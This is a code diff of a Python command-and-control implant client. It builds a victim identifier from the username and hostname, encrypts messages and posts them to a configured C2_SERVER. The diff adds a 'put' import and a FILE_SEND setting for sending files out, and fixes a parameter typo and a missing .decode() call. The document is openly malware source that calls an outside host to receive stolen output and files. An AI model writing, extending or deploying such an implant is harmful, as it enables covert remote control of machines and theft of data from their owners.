@@ -3,10 +3,10 @@
 from os import chdir, getcwd, getenv, uname
 from subprocess import run, PIPE, STDOUT
 from time import sleep, time
-from requests import exceptions, get, post
+from requests import exceptions, get, post, put
 from sys import platform
 from encryption import cipher
-from settings import FILE_REQUEST, PORT, CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
+from settings import FILE_REQUEST, FILE_SEND, PORT, CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
 
 if getenv("OS") == "Windows_NT":
     client = getenv("USERNAME", "") + "@" + getenv("COMPUTERNAME", "") + "@" + str(time())
@@ -20,13 +20,13 @@ else:
 # UTF-8 encode the client first to be able to encrypt it, but then we must decode it after the encyption
 encrypted_client = cipher.encrypt(client.encode()).decode()
 
-def post_to_server(message: str, respone_path: str = RESPONSE):
+def post_to_server(message: str, response_path: str = RESPONSE):
     """ Function to encrypt data and then post it to the c2 server. Accepts a message and a response path (optional) as arguments."""
     try:
         # Byte encode the message and then encrypt it before posting
         message = cipher.encrypt(message.encode())
 
-        post(url=f"http://{C2_SERVER}:{PORT}{respone_path}", data={RESPONSE_KEY: message}, headers=HEADER, proxies=PROXY)
+        post(url=f"http://{C2_SERVER}:{PORT}{response_path}", data={RESPONSE_KEY: message}, headers=HEADER, proxies=PROXY)
     except exceptions.RequestException:
         return
 
@@ -112,7 +112,7 @@ while True:
             filename = filepath.rsplit("/", 1)[-1]
 
             # Byte encode the filename first to be able to encrypt it, but then we must decode it after the encryption
-            encrypted_filename = cipher.encrypt(filename.encode()).decode
+            encrypted_filename = cipher.encrypt(filename.encode()).decode()
 
             print("filename: ", filename)
             print("encrypted_filename: ", encrypted_filename)
